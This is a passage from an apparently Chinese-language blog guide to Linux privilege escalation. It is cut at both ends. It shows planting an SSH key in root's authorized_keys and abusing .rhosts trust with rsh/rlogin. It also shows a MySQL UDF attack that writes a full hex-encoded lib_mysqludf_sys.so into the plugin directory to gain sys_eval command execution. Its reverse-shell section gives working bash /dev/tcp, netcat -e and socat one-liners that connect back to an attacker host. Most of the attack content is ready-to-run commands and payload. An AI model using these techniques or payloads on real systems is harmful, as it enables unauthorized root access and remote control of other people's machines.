id_rsa.pub &gt;&gt; /temp/root/.ssh/authorized_keysssh -i /root/.ssh/id_rsa root@target-ip</code></pre><p>.rhosts文件用来配置哪些远程主机或用户可以访问系统上的本地帐户。如果.rhosts文件的内容为++符号，则说明它允许来自网络上的任何主机和用户的连接。</p><pre><code class="hljs shell">cat .rhosts++</code></pre><p>以下命令将允许系统的root用户直接连接目标系统，系统将不会提示密码输入，因为来自系统的所有用户都将被信任。</p><pre><code class="hljs shell">rsh -l root target-iprlogin -l root target-ip</code></pre><p>或者如果.rhosts的内容不同，则检查文件将有助于确定哪些主机和用户是可信的，因此可以在无需密码的情况下进行身份验证。</p><p>另外一个小工具可以省不少事：<a href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p><h2 id="13-’-’路径配置错误"><a href="#13-’-’路径配置错误" class="headerlink" title="13.’.’路径配置错误"></a>13.’.’路径配置错误</h2><p>这个俺没搞懂，迷迷糊糊的，自己看吧：<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p><h2 id="14-MYSQL数据库提权"><a href="#14-MYSQL数据库提权" class="headerlink" title="14.MYSQL数据库提权"></a>14.MYSQL数据库提权</h2><h3 id="1-UDF提权"><a href="#1-UDF提权" class="headerlink" title="1.UDF提权"></a>1.UDF提权</h3><p>不需要判断mysql是什么版本的，直接查看路径就行，直接写so文件，linux里面的文件是so文件，Windows文件是dll文件。</p><p>我们getshell之后进入终端输入whoami，发现我们只是apache用户权限，我们找一下网站数据库的配置文件，运气好的话查看数据库的账号密码，可以看到账号密码（运气不好就say goodbye，或者进phpmyadmin瞅瞅，或者找到mysql/data/mysql/user.MYD，用enjoy c32asm将其密码账号hex出来）</p><p>登陆mysql数据库，可以在MySQL里输入<code>show variables like ‘%plugin%’; </code>直接查看plugin路径</p><p>然后我们把so文件利用16进制编辑工具进行编码，再解码写入plugin目录中,返回为true，写入成功。</p><p>关于so文件来源：<a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a>  </p><p>下载后解压编译：<code>gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</code></p><p>编译时可能会报错：<code>error:my_compiler.h:No such file or directory</code>,这是一个mysql的bug引起的错误，只要修改/usr/include/mysql/my_global.h文件，注释掉626行重新编译就可以了。生成文件lib_mysqludf_sys.so后，使用Hex.hta获取16进制,我已经将转为16进制的so文件放下面了，自取。</p><pre><code class="hljs mysql">select unhex(&#39;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;) into dumpfile &#39;&#x2F;path_plugin&#x2F;xxx.so&#39;;</code></pre><p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限的。</p><pre><code class="hljs mysql">create function sys_eval returns string &#39;xxx.so&#39;;</code></pre><p>sys_eval这个函数就可以执行系统命令，括号里输入系统命令即可</p><pre><code class="hljs mysql">select sys_eval(&#39;whoami&#39;)</code></pre><p>另外也可以用sqlmap提权，详情参考windows提权总结的数据库提权</p><h2 id="15-反弹shell"><a href="#15-反弹shell" class="headerlink" title="15.反弹shell"></a>15.反弹shell</h2><p>我们已经得到主机的一个webshell,我们想获取一个可以直接操作主机的虚拟终端 </p><h3 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h3><p>目标具有公网ip，可以连接外网。由于各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这里都被阉割了，所以我们需要自己上传一个netcat；或者手动下载二进制安装包，具体如下：</p><pre><code class="hljs vim"><span class="hljs-number">1</span>.wget http<span class="hljs-variable">s:</span>//nchc.<span class="hljs-keyword">dl</span>.sourceforge.net/project/netcat/netcat/<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>/netcat-<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>.tar.gz   #下载二进制netc安装包<span class="hljs-number">2</span>.tar -xvzf netcat-<span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>.tar.gz  #解压安装包<span class="hljs-number">3</span>../configure  #编译安装<span class="hljs-number">4</span>.<span class="hljs-keyword">make</span><span class="hljs-number">5</span>.<span class="hljs-keyword">make</span> install<span class="hljs-number">6</span>.<span class="hljs-keyword">make</span> clean<span class="hljs-number">7</span>.nc -h   #查看是否安装成功，出现以下就代表安装成功GNU netcat <span class="hljs-number">0.7</span>.<span class="hljs-number">1</span>, <span class="hljs-keyword">a</span> rewrite of the famous networking tool.Basic usage<span class="hljs-variable">s:</span>connect <span class="hljs-keyword">to</span> somewhere:  nc [<span class="hljs-keyword">options</span>] <span class="hljs-built_in">hostname</span> port [port] ...listen <span class="hljs-keyword">for</span> inbound:    nc -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">p</span> port [<span class="hljs-keyword">options</span>] [<span class="hljs-built_in">hostname</span>] [port] ...tunnel <span class="hljs-keyword">to</span> somewhere:   nc -L <span class="hljs-built_in">hostname</span>:port -<span class="hljs-keyword">p</span> port [<span class="hljs-keyword">options</span>]Mandatory arguments <span class="hljs-keyword">to</span> long <span class="hljs-keyword">options</span> are mandatory <span class="hljs-keyword">for</span> short <span class="hljs-keyword">options</span> too.Option<span class="hljs-variable">s:</span>  -<span class="hljs-keyword">c</span>, --<span class="hljs-keyword">close</span>                <span class="hljs-keyword">close</span> connection <span class="hljs-keyword">on</span> EOF from stdin  -<span class="hljs-keyword">e</span>, --exec=PROGRAM         program <span class="hljs-keyword">to</span> exec after connect  -g, --gateway=LIST         <span class="hljs-keyword">source</span>-routing hop point[s], <span class="hljs-keyword">up</span> <span class="hljs-keyword">to</span> <span class="hljs-number">8</span>  -G, --pointer=NUM          <span class="hljs-keyword">source</span>-routing pointer: <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, ...  -h, --<span class="hljs-keyword">help</span>                 <span class="hljs-keyword">display</span> this <span class="hljs-keyword">help</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>  -i, --interval=SECS        delay interval <span class="hljs-keyword">for</span> lines sent, ports scanned  -<span class="hljs-keyword">l</span>, --listen               listen <span class="hljs-keyword">mode</span>, <span class="hljs-keyword">for</span> inbound connects  -L, --tunnel=ADDRESS:PORT  forward local port <span class="hljs-keyword">to</span> remote address  -n, --dont-<span class="hljs-built_in">resolve</span>         numeric-<span class="hljs-keyword">only</span> IP addresses, <span class="hljs-keyword">no</span> DNS  -<span class="hljs-keyword">o</span>, --output=FILE          output hexdump traffic <span class="hljs-keyword">to</span> FILE (implies -<span class="hljs-keyword">x</span>)  -<span class="hljs-keyword">p</span>, --local-port=NUM       local port <span class="hljs-keyword">number</span>  -r, --randomize            randomize local <span class="hljs-built_in">and</span> remote ports  -s, --<span class="hljs-keyword">source</span>=ADDRESS       local <span class="hljs-keyword">source</span> address (ip <span class="hljs-built_in">or</span> <span class="hljs-built_in">hostname</span>)  -t, --tcp                  TCP <span class="hljs-keyword">mode</span> (default)  -T, --telnet               answer using TELNET negotiation  -<span class="hljs-keyword">u</span>, --udp                  UDP <span class="hljs-keyword">mode</span>  -v, --<span class="hljs-keyword">verbose</span>              <span class="hljs-keyword">verbose</span> (use twice <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> more <span class="hljs-keyword">verbose</span>)  -V, --<span class="hljs-keyword">version</span>              output <span class="hljs-keyword">version</span> information <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span>  -<span class="hljs-keyword">x</span>, --hexdump              hexdump incoming <span class="hljs-built_in">and</span> outgoing traffic  -<span class="hljs-keyword">w</span>, --wait=SECS            timeout <span class="hljs-keyword">for</span> connects <span class="hljs-built_in">and</span> final net reads  -<span class="hljs-keyword">z</span>, --zero                 zero-I/O <span class="hljs-keyword">mode</span> (used <span class="hljs-keyword">for</span> scanning)Remote port <span class="hljs-keyword">number</span> can also <span class="hljs-keyword">be</span> specified <span class="hljs-keyword">as</span> <span class="hljs-built_in">range</span>.  Example: <span class="hljs-string">&#x27;1-1024&#x27;</span></code></pre><p>目标开启本地监听并将本地的bash发布出去：<code>nc -lvvp 8080 -t -e /bin/bash</code></p><p>攻击机直连目标获得root权限：<code>nc target-ip 8080</code></p><h3 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h3><p>目标为内网主机，没有公网ip，无法被外网直接访问，但是可以出网，我们可以让目标访问外网。方法很多，介绍几种常见的方法，和windows差不多。</p><h4 id="1-bash直接反弹"><a href="#1-bash直接反弹" class="headerlink" title="1.bash直接反弹"></a>1.bash直接反弹</h4><p>一句话直接反弹：<code>bash -i &gt;&amp; /dev/tcp/target-ip/8080 0&gt;&amp;1</code></p><p><strong>解释</strong>：</p><p><code>bash -i </code>：产生一个bash交互环境</p><p><code>&gt;&amp;</code>：将联合符号的内容与后面相结合然后一起重定向给后者</p><p><code>/dev/tcp/target-ip/8080</code>：linux环境中所有内容均以文件形式存在，让主机与目标主机<code>target-ip/port</code>建立一个tcp连接</p><p><code>0&gt;&amp;1</code>：将标准输入与输出相结合，然后重定向给前面标准输出的内容</p><p>总结：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p><h4 id="2-nc反弹"><a href="#2-nc反弹" class="headerlink" title="2.nc反弹"></a>2.nc反弹</h4><p>linux自带的nc无法反弹一个bash给远端，需要手动上传一个或者下载一个nc，但是nc反弹的shell交互性比较差。</p><p>攻击机开启监听：<code>nc -lvvp 8080</code></p><p>目标机：<code>nc server-ip 8080 -t -e /bin/bash</code></p><h4 id="3-socat反弹"><a href="#3-socat反弹" class="headerlink" title="3.socat反弹"></a>3.socat反弹</h4><p>nc的加强版</p><p>攻击机开启监听：<code>socat TCP-LISTEN:12345 -</code></p><p>目标机：<code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:server-ip：12345</code></p><h4 id="4-msf反弹"><a href="#4-msf反弹" class="headerlink" 